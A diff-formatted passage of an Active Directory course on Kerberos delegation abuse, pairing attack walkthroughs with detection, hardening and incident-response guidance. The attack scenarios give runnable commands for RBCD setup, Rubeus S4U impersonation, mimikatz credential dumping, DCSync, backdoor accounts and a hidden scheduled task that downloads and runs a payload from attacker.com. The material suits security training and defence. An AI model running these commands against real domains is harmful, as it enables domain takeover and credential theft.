+Add-ADGroupMember -Identity "Domain Admins" -Members "support_svc"
+
+# Add to local administrators on key servers
+Add-LocalGroupMember -Group "Administrators" -Member "CORP\support_svc"
+```
+
+---
+
+#### Scenario 2: RBCD Privilege Escalation Chain
+
+**Objective:** Escalate from standard user to server admin using RBCD.
+
+**Environment:**
+- Current access: Domain user with GenericWrite on multiple computers
+- Targets: File servers, SQL servers, web servers
+- Goal: Access to sensitive data and admin control
+
+**Attack Chain:**
+```
+1. Enumerate write permissions on computer objects
+2. Prioritize targets based on value
+3. Create attacker-controlled computer account
+4. Configure RBCD on target computers
+5. Impersonate administrators to each target
+6. Extract additional credentials
+7. Pivot to additional systems
+8. Maintain persistent access
+```
+
+**Detailed Execution:**
+
+**Step 1: Permission Enumeration**
+```powershell
+# Import PowerView
+Import-Module .\PowerView.ps1
+
+# Find computers where current user has write access
+$CurrentUserSID = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
+
+$WritableComputers = Get-DomainComputer | ForEach-Object {
+    $computer = $_
+    $acl = Get-DomainObjectAcl -Identity $computer.distinguishedname -ResolveGUIDs
+    
+    foreach($ace in $acl) {
+        if(($ace.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteProperty") -and
+           ($ace.SecurityIdentifier -eq $CurrentUserSID)) {
+            return $computer.name
+        }
+    }
+}
+
+Write-Host "[+] Found $($WritableComputers.Count) writable computers"
+$WritableComputers
+
+# Output:
+# FILESERVER01
+# FILESERVER02
+# SQLSERVER01
+# WEBSERVER01
+```
+
+**Step 2: Target Prioritization**
+```powershell
+# Analyze targets for value
+foreach($target in $WritableComputers) {
+    Write-Host "`n[*] Analyzing $target"
+    
+    # Check shares
+    $shares = Get-NetShare -ComputerName $target
+    Write-Host "    Shares: $($shares.name -join ', ')"
+    
+    # Check SPNs (indicates services)
+    $computer = Get-ADComputer $target -Properties ServicePrincipalName
+    Write-Host "    Services: $($computer.ServicePrincipalName -join ', ')"
+    
+    # Check logged-in users (if accessible)
+    try {
+        $sessions = Get-NetLoggedon -ComputerName $target
+        Write-Host "    Logged-in users: $($sessions.UserName -join ', ')"
+    } catch {}
+}
+
+# Priority ranking:
+# 1. SQLSERVER01 (database access, likely has service accounts)
+# 2. FILESERVER01 (file shares, may have sensitive data)
+# 3. WEBSERVER01 (web services, potential for further exploitation)
+```
+
+**Step 3: Create Computer Account**
+```powershell
+# Check MachineAccountQuota
+$quota = (Get-ADDomain).DistinguishedName | ForEach-Object {
+    (Get-ADObject $_ -Properties ms-DS-MachineAccountQuota).'ms-DS-MachineAccountQuota'
+}
+Write-Host "[*] MachineAccountQuota: $quota"
+
+# Create computer account
+Import-Module .\Powermad.ps1
+New-MachineAccount -MachineAccount "ATTACK-PC" -Password $(ConvertTo-SecureString 'AttackPass123!' -AsPlainText -Force) -Verbose
+
+# Verify creation
+Get-ADComputer "ATTACK-PC"
+```
+
+**Step 4: Configure RBCD on Targets**
+```powershell
+# Get attacker computer SID
+$AttackerSID = (Get-ADComputer "ATTACK-PC").SID
+
+# Function to set RBCD
+function Set-RBCD {
+    param($Target, $TrustedSID)
+    
+    $SD = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$TrustedSID)"
+    $SDBytes = New-Object byte[] ($SD.BinaryLength)
+    $SD.GetBinaryForm($SDBytes, 0)
+    
+    Get-DomainComputer $Target | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
+}
+
+# Configure RBCD on each target
+Set-RBCD -Target "SQLSERVER01" -TrustedSID $AttackerSID
+Set-RBCD -Target "FILESERVER01" -TrustedSID $AttackerSID
+Set-RBCD -Target "FILESERVER02" -TrustedSID $AttackerSID
+Set-RBCD -Target "WEBSERVER01" -TrustedSID $AttackerSID
+
+Write-Host "[+] RBCD configured on all targets"
+```
+
+**Step 5: Exploitation**
+```powershell
+# Get TGT for attacker computer
+.\Rubeus.exe asktgt /user:ATTACK-PC$ /password:AttackPass123! /domain:corp.local /nowrap /outfile:tgt.txt
+$TGT = Get-Content tgt.txt
+
+# Exploit SQLSERVER01
+Write-Host "`n[*] Attacking SQLSERVER01"
+.\Rubeus.exe s4u /user:ATTACK-PC$ /impersonateuser:Administrator /msdsspn:MSSQLSvc/sqlserver01.corp.local /altservice:CIFS,HOST /ticket:$TGT /nowrap /ptt
+
+# Access SQL server
+dir \\sqlserver01.corp.local\c$
+# Deploy tools
+copy mimikatz.exe \\sqlserver01.corp.local\c$\temp\
+
+# Execute remotely
+psexec.exe \\sqlserver01.corp.local -s cmd.exe
+
+# On SQL server, extract credentials
+C:\temp\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > creds.txt
+
+# Found: svc_sql account with credentials
+```
+
+**Step 6: Lateral Movement**
+```powershell
+# Use discovered svc_sql account
+# Check what svc_sql can access
+Get-DomainComputer | ForEach-Object {
+    $access = Test-AdminAccess -ComputerName $_.name -WarningAction SilentlyContinue
+    if($access) {
+        Write-Host "[+] svc_sql has admin on: $($_.name)"
+    }
+}
+
+# Output shows svc_sql is admin on multiple database servers
+# Continue exploitation across environment
+```
+
+**Step 7: Persistence**
+```powershell
+# Create scheduled tasks on compromised servers
+$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoP -W Hidden -C `"IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')`""
+$trigger = New-ScheduledTaskTrigger -AtStartup
+Register-ScheduledTask -TaskName "SystemUpdates" -Action $action -Trigger $trigger -RunLevel Highest
+
+# Maintain RBCD configurations
+# Keep attacker computer account active
+# Periodically refresh tickets
+```
+
+---
+
+#### Scenario 3: Constrained Delegation with Alternative Service Abuse
+
+**Objective:** Abuse constrained delegation to access Domain Controller.
+
+**Environment:**
+- Compromised account: svc_web (web service account)
+- Delegation: Allowed to HTTP/web.corp.local
+- Web.corp.local is also a Domain Controller (misconfiguration!)
+- Goal: DCSync and domain control
+
+**Attack Execution:**
+
+**Step 1: Validate Delegation Configuration**
+```powershell
+# Check svc_web delegation settings
+Get-ADUser svc_web -Properties msDS-AllowedToDelegateTo,TrustedToAuthForDelegation
+
+# Output:
+# msDS-AllowedToDelegateTo: {HTTP/web.corp.local}
+# TrustedToAuthForDelegation: True (protocol transition enabled!)
+
+# Verify web.corp.local is a DC
+Get-ADDomainController | Where-Object {$_.HostName -eq "web.corp.local"}
+# Confirmed: web.corp.local is DC!
+```
+
+**Step 2: Alternative Service Attack**
+```powershell
+# Request TGT for svc_web
+.\Rubeus.exe asktgt /user:svc_web /password:CompromisedPass123! /domain:corp.local /nowrap
+
+# Instead of HTTP, request LDAP service (for DCSync)
+.\Rubeus.exe s4u /user:svc_web /impersonateuser:Administrator /msdsspn:HTTP/web.corp.local /altservice:LDAP /ticket:BASE64_TGT /nowrap /ptt
+
+# Verify ticket
+klist
+# Shows: Administrator@LDAP/web.corp.local
+```
+
+**Step 3: DCSync**
+```cmd
+# With LDAP ticket to DC, perform DCSync
+mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt
+
+# Success! Extract all hashes
+mimikatz # lsadump::dcsync /domain:corp.local /all /csv > all_creds.csv
+```
+
+**Step 4: Multiple Service Exploitation**
+```powershell
+# Request tickets for multiple services on DC
+.\Rubeus.exe s4u /user:svc_web /impersonateuser:Administrator /msdsspn:HTTP/web.corp.local /altservice:LDAP,CIFS,HOST /ticket:BASE64_TGT /nowrap
+
+# Now have:
+# - LDAP: Directory access, DCSync
+# - CIFS: File system access to DC
+# - HOST: WinRM, scheduled tasks on DC
+
+# Access DC file system
+dir \\web.corp.local\c$
+dir \\web.corp.local\SYSVOL
+
+# Execute commands via WinRM
+Enter-PSSession -ComputerName web.corp.local
+# Now have interactive shell on DC as Administrator!
+```
+
+---
+
+### Persistence Mechanisms
+
+#### Method 1: Maintaining RBCD Configurations
+
+**Persistent RBCD:**
+```powershell
+# Create multiple computer accounts for redundancy
+$computers = @("BACKUP-PC1", "BACKUP-PC2", "BACKUP-PC3")
+
+foreach($comp in $computers) {
+    New-MachineAccount -MachineAccount $comp -Password $(ConvertTo-SecureString "Pass$comp!" -AsPlainText -Force)
+    
+    # Configure RBCD on high-value targets
+    $CompSID = (Get-ADComputer $comp).SID
+    $SD = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$CompSID)"
+    $SDBytes = New-Object byte[] ($SD.BinaryLength)
+    $SD.GetBinaryForm($SDBytes, 0)
+    
+    # Set on multiple targets
+    Get-DomainComputer "FILESERVER01" | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
+    Get-DomainComputer "SQLSERVER01" | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
+}
+
+# Result: Multiple backup access paths if one is discovered
+```
+
+**Scheduled RBCD Refresh:**
+```powershell
+# Script to maintain RBCD configurations
+$script = @'
+$AttackerSID = (Get-ADComputer "ATTACK-PC").SID
+$SD = New-Object Security.AccessControl.RawSecurityDescriptor "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$AttackerSID)"
+$SDBytes = New-Object byte[] ($SD.BinaryLength)
+$SD.GetBinaryForm($SDBytes, 0)
+
+$targets = @("FILESERVER01","SQLSERVER01","WEBSERVER01")
+foreach($target in $targets) {
+    try {
+        Get-ADComputer $target | Set-ADComputer -Replace @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
+    } catch {}
+}
+'@
+
+# Deploy as scheduled task
+$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoP -W Hidden -C `"$script`""
+$trigger = New-ScheduledTaskTrigger -Daily -At "3:00AM"
+Register-ScheduledTask -TaskName "ADHealthCheck" -Action $action -Trigger $trigger
+```
+
+#### Method 2: Ticket Renewal and Storage
+
+**Automated Ticket Renewal:**
+```powershell
+# Continuously renew and store high-value tickets
+$renewScript = @'
+while($true) {
+    # Get TGT for attacker computer
+    $tgt = .\Rubeus.exe asktgt /user:ATTACK-PC$ /password:Pass123! /nowrap
+    
+    # Request tickets for key services
+    $tickets = .\Rubeus.exe s4u /user:ATTACK-PC$ /impersonateuser:Administrator /msdsspn:CIFS/fileserver01 /altservice:CIFS,HTTP,HOST /ticket:$tgt /nowrap
+    
+    # Store tickets
+    $tickets | Out-File "C:\ProgramData\cache_$((Get-Date).ToString('yyyyMMdd_HHmmss')).txt"
+    
+    # Sleep for 8 hours (before expiration)
+    Start-Sleep -Seconds 28800
+}
+'@
+
+# Run in background job
+Start-Job -ScriptBlock ([scriptblock]::Create($renewScript))
+```
+
+#### Method 3: Backup Delegation Paths
+
+**Multiple Attack Vectors:**
+```powershell
+# Document all working delegation paths
+$delegationPaths = @()
+
+# Unconstrained delegation servers
+$unconstrained = Get-DomainComputer -Unconstrained
+foreach($server in $unconstrained) {
+    $delegationPaths += [PSCustomObject]@{
+        Type = "Unconstrained"
+        Source = $server.name
+        Target = "ANY"
+        Account = "N/A"
+        Access = "Requires admin on $($server.name)"
+    }
+}
+
+# Constrained delegation accounts
+$constrained = Get-DomainObject -LDAPFilter "(msDS-AllowedToDelegateTo=*)"
+foreach($obj in $constrained) {
+    foreach($spn in $obj.'msDS-AllowedToDelegateTo') {
+        $delegationPaths += [PSCustomObject]@{
+            Type = "Constrained"
+            Source = $obj.name
+            Target = $spn
+            Account = $obj.samaccountname
+            Access = "Requires compromise of $($obj.samaccountname)"
+        }
+    }
+}
+
+# RBCD configurations
+$rbcd = Get-DomainComputer | Where-Object {$_.'msds-allowedtoactonbehalfofotheridentity'}
+foreach($comp in $rbcd) {
+    $delegationPaths += [PSCustomObject]@{
+        Type = "RBCD"
+        Source = "ATTACK-PC"
+        Target = $comp.name
+        Account = "ATTACK-PC$"
+        Access = "Always available (RBCD configured)"
+    }
+}
+
+# Export for reference
+$delegationPaths | Export-Csv delegation_paths.csv -NoTypeInformation
+
+# Store credentials for all paths
+$credentials = @{
+    "svc_web" = "CompromisedPass123!"
+    "ATTACK-PC$" = "AttackPass123!"
+    "svc_sql" = "SQLServicePass456!"
+}
+
+$credentials | ConvertTo-Json | Out-File credentials.json
+```
+
+#### Method 4: Delegation-Based Backdoors
+
+**Creating Persistent Delegation:**
+```powershell
+# Create new service account with delegation
+New-ADUser -Name "Monitoring Service" -SamAccountName "svc_monitor" -AccountPassword (ConvertTo-SecureString "MonitorP@ss123!" -AsPlainText -Force) -Enabled $true
+
+# Set SPN (makes it look legitimate)
+Set-ADUser svc_monitor -ServicePrincipalName "HTTP/monitoring.corp.local"
+
+# Configure constrained delegation with protocol transition
+Set-ADUser svc_monitor -Add @{
+    'msDS-AllowedToDelegateTo'=@(
+        'CIFS/dc01.corp.local',
+        'LDAP/dc01.corp.local',
+        'HTTP/fileserver.corp.local'
+    )
+}
+
+# Enable protocol transition
+Set-ADAccountControl svc_monitor -TrustedToAuthForDelegation $true
+
+# Verify
+Get-ADUser svc_monitor -Properties msDS-AllowedToDelegateTo,TrustedToAuthForDelegation
+
+# Now have legitimate-looking backdoor account with delegation to DC
+```
+
+---
+
+## 10. Detection, Prevention, and Mitigation
+
+### Detection Strategies
+
+#### Event Log Monitoring
+
+**Critical Event IDs for Delegation:**
+```
+4624 - Successful Logon (check for delegation flags)
+4648 - Logon using explicit credentials
+4768 - Kerberos TGT Request
+4769 - Kerberos Service Ticket Request (S4U indicators)
+4770 - Kerberos Service Ticket Renewed
+4776 - Credential validation
+5136 - Directory Service Object Modified (RBCD changes)
+```
+
+**Unconstrained Delegation Detection:**
+```powershell
+# Monitor for TGT storage on unconstrained servers
+Get-WinEvent -FilterHashtable @{
+    LogName='Security'
+    ID=4768
+} | Where-Object {
+    # TGT request with forwardable flag
+    $_.Properties[10].Value -band 0x40000000
+}
+
+# Alert on authentication to unconstrained servers
+Get-WinEvent -FilterHashtable @{
+    LogName='Security'
+    ID=4624
+} | Where-Object {
+    $targetServer = $_.Properties[5].Value
+    # Check if target has unconstrained delegation
+    $unconstrained = Get-ADComputer -Filter {TrustedForDelegation -eq $true}
+    $targetServer -in $unconstrained.DNSHostName
+}
+```
+
+**Constrained Delegation Detection:**
+```powershell
+# Detect S4U2Self requests
+Get-WinEvent -FilterHashtable @{
+    LogName='Security'
+    ID=4769
+} | Where-Object {
+    $_.Message -match "S4U2self"
+}
+
+# Detect S4U2Proxy requests
+Get-WinEvent -FilterHashtable @{
+    LogName='Security'
+    ID=4769
+} | Where-Object {
+    $_.Message -match "S4U2proxy"
+}
+
+# Alert on unusual S4U activity
+Get-WinEvent -FilterHashtable @{
+    LogName='Security'
+    ID=4769
+    StartTime=(Get-Date).AddHours(-24)
+} | Where-Object {
+    ($_.Message -match "S4U") -and
+    ($_.Properties[0].Value -match "Administrator|Domain Admin")
+} | Select TimeCreated,@{N='User';E={$_.Properties[0].Value}},@{N='Service';E={$_.Properties[1].Value}}
+```
+
+**RBCD Detection:**
+```powershell
+# Monitor for msDS-AllowedToActOnBehalfOfOtherIdentity changes
+Get-WinEvent -FilterHashtable @{
+    LogName='Security'
+    ID=5136
+} | Where-Object {
+    $_.Message -match "msDS-AllowedToActOnBehalfOfOtherIdentity"
+}
+
+# Script to alert on RBCD changes
+$scriptBlock = {
+    $event = $args[0]
+    if($event.Message -match "msDS-AllowedToActOnBehalfOfOtherIdentity") {
+        $computer = $event.Properties[8].Value
+        $who = $event.Properties[3].Value
+        
+        Send-MailMessage -To "security@corp.com" -Subject "RBCD Configuration Change" -Body "Computer $computer was modified by $who to allow delegation" -SmtpServer "mail.corp.local"
+    }
+}
+
+Register-WmiEvent -Query "SELECT * FROM __InstanceModificationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_NTLogEvent' AND TargetInstance.EventCode = 5136" -Action $scriptBlock
+```
+
+#### Behavioral Detection
+
+**Anomaly Indicators:**
+```
+- S4U requests for privileged users from service accounts
+- Alternative service names in ticket requests
+- Service tickets requested for Domain Controllers
+- New computer accounts created and used immediately
+- RBCD configurations on sensitive computers
+- Service accounts authenticating to unconstrained servers
+- Ticket requests outside normal service patterns
+- High volume of S4U2Self/S4U2Proxy requests
+```
+
+**SIEM Queries (Splunk):**
+```spl
+# Detect S4U abuse
+index=windows EventCode=4769 Message="*S4U*"
+| stats count by src_user, dest_service, src_ip
+| where count > 10
+
+# Detect RBCD changes
+index=windows EventCode=5136 AttributeLDAPDisplayName="msDS-AllowedToActOnBehalfOfOtherIdentity"
+| table _time, ComputerName, SubjectUserName, ObjectDN
+
+# Detect unconstrained delegation abuse
+index=windows EventCode=4624 LogonType=3
+| lookup unconstrained_servers.csv server_name as Computer OUTPUT is_unconstrained
+| where is_unconstrained=1 AND TargetUserName="*$"
+| stats count by TargetUserName, Computer
+
+# Detect printer bug / coercion attacks
+index=windows EventCode=4624 LogonType=3 TargetUserName="*$"
+| where Computer IN (unconstrained_servers)
+| stats values(SourceNetworkAddress) by TargetUserName, Computer
+```
+
+### Prevention Measures
+
+#### Limiting Unconstrained Delegation
+
+**Audit Existing Configurations:**
+```powershell
+# Find all unconstrained delegation
+$unconstrained = Get-ADComputer -Filter {TrustedForDelegation -eq $true -and OperatingSystem -notlike "*Domain Controller*"}
+
+Write-Warning "[!] Found $($unconstrained.Count) computers with unconstrained delegation (excluding DCs)"
+
+foreach($computer in $unconstrained) {
+    Write-Host "`n[*] $($computer.Name)"
+    Write-Host "    OS: $($computer.OperatingSystem)"
+    Write-Host "    DNS: $($computer.DNSHostName)"
+    
+    # Recommend remediation
+    Write-Host "    ACTION: Convert to constrained delegation or remove if not needed"
+}
+```
+
+**Remove Unconstrained Delegation:**
+```powershell
+# For non-DC servers, remove unconstrained delegation
+$servers = Get-ADComputer -Filter {TrustedForDelegation -eq $true -and OperatingSystem -notlike "*Domain Controller*"}
+
+foreach($server in $servers) {
+    # Disable unconstrained delegation
+    Set-ADAccountControl -Identity $server -TrustedForDelegation $false
+    
+    Write-Host "[+] Removed unconstrained delegation from $($server.Name)"
+    
+    # If service needs delegation, configure constrained instead
+    # Set-ADUser svc_account -Add @{'msDS-AllowedToDelegateTo'=@('HTTP/backend.corp.local')}
+}
+```
+
+**Protect Against Coercion Attacks:**
+```powershell
+# Disable Print Spooler service on DCs and sensitive servers
+$servers = Get-ADComputer -Filter {OperatingSystem -like "*Server*"}
+
+foreach($server in $servers) {
+    Invoke-Command -ComputerName $server.DNSHostName -ScriptBlock {
+        Stop-Service -Name Spooler -Force
+        Set-Service -Name Spooler -StartupType Disabled
+    }
+}
+
+# Disable LLMNR and NBT-NS
+# Via Group Policy:
+# Computer Configuration → Policies → Administrative Templates → Network → DNS Client
+# "Turn off multicast name resolution" = Enabled
+```
+
+#### Hardening Constrained Delegation
+
+**Audit Constrained Delegation:**
+```powershell
+# Review all constrained delegation configurations
+$constrained = Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo,TrustedToAuthForDelegation,ObjectClass
+
+$report = foreach($obj in $constrained) {
+    [PSCustomObject]@{
+        Name = $obj.Name
+        Type = $obj.ObjectClass
+        ProtocolTransition = $obj.TrustedToAuthForDelegation
+        AllowedTargets = ($obj.'msDS-AllowedToDelegateTo' -join '; ')
+        Risk = if($obj.TrustedToAuthForDelegation) {"HIGH"} else {"MEDIUM"}
+    }
+}
+
+$report | Export-Csv constrained_delegation_audit.csv -NoTypeInformation
+$report | Where-Object {$_.Risk -eq "HIGH"} | Format-Table
+```
+
+**Remove Protocol Transition:**
+```powershell
+# Disable TrustedToAuthForDelegation where not absolutely needed
+$protoTransAccounts = Get-ADObject -Filter {TrustedToAuthForDelegation -eq $true}
+
+foreach($account in $protoTransAccounts) {
+    # Review if protocol transition is actually required
+    Write-Host "[*] Review $($account.Name) - Protocol Transition enabled"
+    
+    # If not needed, disable
+    # Set-ADAccountControl -Identity $account -TrustedToAuthForDelegation $false
+}
+```
+
+**Restrict Delegation Targets:**
+```powershell
+# Ensure delegation only to specific services, not entire hosts
+$constrained = Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
+
+foreach($obj in $constrained) {
+    foreach($spn in $obj.'msDS-AllowedToDelegateTo') {
+        # Check if SPN is too broad
+        if($spn -match "^HOST/") {
+            Write-Warning "[!] $($obj.Name) can delegate to HOST service (very broad)"
+            Write-Warning "    Consider restricting to specific services (CIFS, HTTP, etc.)"
+        }
+    }
+}
+```
+
+#### RBCD Protection
+
+**Reduce MachineAccountQuota:**
+```powershell
+# Set MachineAccountQuota to 0 (prevent users from creating computers)
+Set-ADDomain -Identity (Get-ADDomain) -Replace @{"ms-DS-MachineAccountQuota"="0"}
+
+# Verify
+(Get-ADDomain).DistinguishedName | ForEach-Object {
+    (Get-ADObject $_ -Properties ms-DS-MachineAccountQuota).'ms-DS-MachineAccountQuota'
+}
+
+# Should return 0
+```
+
+**Audit ACLs on Computer Objects:**
+```powershell
+# Find computers where non-admin users have write access
+$computers = Get-ADComputer -Filter *
+
+$riskyACLs = foreach($computer in $computers) {
+    $acl = Get-Acl "AD:\$($computer.DistinguishedName)"
+    
+    foreach($access in $acl.Access) {
+        # Check for non-admin users with write access
+        if(($access.IdentityReference -notmatch "Domain Admins|Enterprise Admins|SYSTEM") -and
+           ($access.ActiveDirectoryRights -match "GenericAll|GenericWrite|WriteProperty")) {
+            [PSCustomObject]@{
+                Computer = $computer.Name
+                Principal = $access.IdentityReference
+                Rights = $access.ActiveDirectoryRights
+            }
+        }
+    }
+}
+
+$riskyACLs | Export-Csv risky_computer_acls.csv -NoTypeInformation
+
+# Review and remediate
+```
+
+**Remove Unnecessary Write Permissions:**
+```powershell
+# Remove GenericWrite from Domain Users on computer objects
+$computers = Get-ADComputer -Filter *
+$domainUsersSID = (Get-ADGroup "Domain Users").SID
+
+foreach($computer in $computers) {
+    $acl = Get-Acl "AD:\$($computer.DistinguishedName)"
+    
+    # Find Domain Users ACEs
+    $acesToRemove = $acl.Access | Where-Object {
+        ($_.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier]) -eq $domainUsersSID) -and
+        ($_.ActiveDirectoryRights -match "GenericWrite|GenericAll")
+    }
+    
+    foreach($ace in $acesToRemove) {
+        $acl.RemoveAccessRule($ace)
+    }
+    
+    Set-Acl "AD:\$($computer.DistinguishedName)" -AclObject $acl
+}
+```
+
+**Monitor RBCD Changes:**
+```powershell
+# Enable auditing on computer objects
+$computers = Get-ADComputer -Filter {OperatingSystem -like "*Server*"}
+
+foreach($computer in $computers) {
+    # Enable auditing
+    $guid = [guid]'bf967a86-0de6-11d0-a285-00aa003049e2' # Computer objects
+    $acl = Get-Acl "AD:\$($computer.DistinguishedName)"
+    
+    $auditRule = New-Object System.DirectoryServices.ActiveDirectoryAuditRule(
+        [System.Security.Principal.SecurityIdentifier]"S-1-1-0", # Everyone
+        [System.DirectoryServices.ActiveDirectoryRights]::WriteProperty,
+        [System.Security.AccessControl.AuditFlags]::Success,
+        $guid
+    )
+    
+    $acl.AddAuditRule($auditRule)
+    Set-Acl "AD:\$($computer.DistinguishedName)" -AclObject $acl
+}
+
+# Configure SACL for msDS-AllowedToActOnBehalfOfOtherIdentity
+```
+
+#### Account Protections
+
+**Protected Users Group:**
+```powershell
+# Add privileged accounts to Protected Users
+$privilegedAccounts = Get-ADGroupMember "Domain Admins"
+$privilegedAccounts += Get-ADGroupMember "Enterprise Admins"
+$privilegedAccounts += Get-ADUser -Filter {AdminCount -eq 1}
+
+foreach($account in $privilegedAccounts) {
+    Add-ADGroupMember -Identity "Protected Users" -Members $account.SamAccountName
+    Write-Host "[+] Added $($account.SamAccountName) to Protected Users"
+}
+
+# Protected Users group prevents:
+# - Delegation of credentials
+# - NTLM authentication
+# - DES/RC4 encryption
+# - Ticket caching
+```
+
+**Account is Sensitive and Cannot be Delegated:**
+```powershell
+# Set on critical accounts
+$criticalAccounts = @("Administrator","krbtgt","KRBTGT_*")
+$criticalAccounts += (Get-ADUser -Filter {AdminCount -eq 1}).SamAccountName
+
+foreach($account in $criticalAccounts) {
+    Set-ADAccountControl -Identity $account -AccountNotDelegated $true
+    Write-Host "[+] Set AccountNotDelegated for $account"
+}
+
+# Verify
+Get-ADUser -Filter {AccountNotDelegated -eq $true} | Select SamAccountName
+```
+
+### Incident Response
+
+#### Detecting Active Delegation Attacks
+
+**Check for Suspicious Tickets:**
+```powershell
+# On potentially compromised server
+# List all tickets
+klist
+
+# Look for:
+# - Computer account tickets (COMPUTERNAME$)
+# - Multiple tickets for different users
+# - Tickets for privileged accounts
+# - Unexpected service tickets
+```
+
+**Check for RBCD Modifications:**
+```powershell
+# Query recent RBCD changes
+Get-WinEvent -FilterHashtable @{
+    LogName='Security'
+    ID=5136
+    StartTime=(Get-Date).AddDays(-7)
+} | Where-Object {
+    $_.Message -match "msDS-AllowedToActOnBehalfOfOtherIdentity"
+} | Select TimeCreated,@{N='Computer';E={$_.Properties[8].Value}},@{N='ModifiedBy';E={$_.Properties[3].Value}}
+
+# Investigate each change
+```
+
+**Identify Compromised Service Accounts:**
+```powershell
+# Check for unusual S4U activity
+Get-WinEvent -FilterHashtable @{
+    LogName='Security'
+    ID=4769
+    StartTime=(Get-Date).AddHours(-24)
+} | Where-Object {
+    $_.Message -match "S4U"
+} | Group-Object {$_.Properties[0].Value} | Sort-Object Count -Descending
+
+# Top users performing S4U should be investigated
+```
+
+#### Response Actions
+
+**Immediate Containment:**
+```powershell
+# 1. Disable compromised accounts
+Disable-ADAccount -Identity "svc_compromised"
+
+# 2. Reset passwords
+Set-ADAccountPassword -Identity "svc_compromised" -Reset -NewPassword (ConvertTo-SecureString "TempP@ss$(Get-Random)!" -AsPlainText -Force)
+
+# 3. Revoke Kerberos tickets
+# Force password change on all domain users
+Get-ADUser -Filter * | Set-ADUser -ChangePasswordAtLogon $true
+
+# 4. Remove RBCD configurations
+$computers = Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
+foreach($comp in $computers) {
+    if($comp.'msDS-AllowedToActOnBehalfOfOtherIdentity') {
+        Set-ADComputer $comp -Clear msDS-AllowedToActOnBehalfOfOtherIdentity
+    }
+}
+
+# 5. Delete attacker-created computer accounts
+$suspiciousComputers = Get-ADComputer -Filter {Created -gt (Get-Date).AddDays(-7)}
+# Review and delete if confirmed malicious
+```
+
+**Investigation:**
+```powershell
+# Timeline of delegation abuse
+$timeline = @()
+
+# Collect S4U events
+$s4uEvents = Get-WinEvent -FilterHashtable @{
+    LogName='Security'
+    ID=4769
+    StartTime=$IncidentStartTime
+} | Where-Object {$_.Message -match "S4U"}
+
+foreach($event in $s4uEvents) {
+    $timeline += [PSCustomObject]@{
+        Time = $event.TimeCreated
+        EventType = "S4U Request"
+        User = $event.Properties[0].Value
+        Service = $event.Properties[1].Value
+        Source = $event.Properties[11].Value
+    }
+}
+
+# Collect RBCD changes
+$rbcdEvents = Get-WinEvent -FilterHashtable @{
+    LogName='Security'
+    ID=5136
+    StartTime=$IncidentStartTime
+} | Where-Object {$_.Message -match "msDS-AllowedToActOnBehalfOfOtherIdentity"}
+
+foreach($event in $rbcdEvents) {
+    $timeline += [PSCustomObject]@{
+        Time = $event.TimeCreated
+        EventType = "RBCD Modification"
+        User = $event.Properties[3].Value
+        Target = $event.Properties[8].Value
+        Action = $event.Properties[14].Value
+    }
+}
+
+# Sort and export
+$timeline | Sort-Object Time | Export-Csv incident_timeline.csv -NoTypeInformation
+```
+
+**Remediation:**
+```powershell
+# 1. Remove all unconstrained delegation except DCs
+Get-ADComputer -Filter {TrustedForDelegation -eq $true -and OperatingSystem -notlike "*Domain Controller*"} | Set-ADAccountControl -TrustedForDelegation $false
+
+# 2. Review and restrict constrained delegation
+$constrained = Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"}
+foreach($obj in $constrained) {
+    Write-Host "Review delegation for: $($obj.Name)"
+    # Manual review and approval process
+}
+
+# 3. Set MachineAccountQuota to 0
+Set-ADDomain -Replace @{"ms-DS-MachineAccountQuota"="0"}
+
+# 4. Add all privileged accounts to Protected Users
+Get-ADUser -Filter {AdminCount -eq 1} | Add-ADGroupMember -Identity "Protected Users"
+
+# 5. Enable advanced auditing
+# Audit directory service changes
+# Audit Kerberos service ticket operations
+# Audit credential validation
+
+# 6. Deploy monitoring for future attacks
+# Configure SIEM rules
+# Deploy hunting queries
+# Enable alerts for RBCD changes
+```
+
+---
+
+## Course Summary
+
+### Key Takeaways
+
+**Unconstrained Delegation:**
+- Highest risk delegation type
+- Stores user TGTs in memory
+- Can compromise any authenticated user
+- Should only be used on Domain Controllers
+- Vulnerable to coercion attacks (Printer Bug, PetitPotam)
+- Remediation: Remove or convert to constrained delegation
+
+**Constrained Delegation:**
+- Allows delegation to specific services
+- Alternative service attack bypasses restrictions
+- Protocol transition enables impersonation without user auth
+- S4U2Self and S4U2Proxy are core to abuse
+- Remediation: Remove protocol transition where possible, restrict targets
+
+**Resource-Based Constrained Delegation (RBCD):**
+- Lower privilege requirement (GenericWrite vs Domain Admin)
+- Self-service configuration
+- Requires computer account control
+- Very flexible for attackers
+- Remediation: Set MachineAccountQuota to 0, audit ACLs
+
+**S4U Extensions:**
+- S4U2Self: Get ticket for self on behalf of user
+- S4U2Proxy: Get ticket to backend service as user
+- Enable protocol transition and delegation
+- Core to constrained delegation and RBCD attacks
+- Detection: Monitor Event ID 4769 for S4U indicators
+
+### Critical Attack Workflows
+
+**Unconstrained Delegation Attack:**
+```
+1. Find unconstrained delegation servers
+2. Compromise server (exploit or credential theft)
+3. Coerce high-value authentication (Printer Bug)
+4. Extract TGT from server memory
+5. Use TGT for impersonation
+6. DCSync if DC TGT captured
+```
+
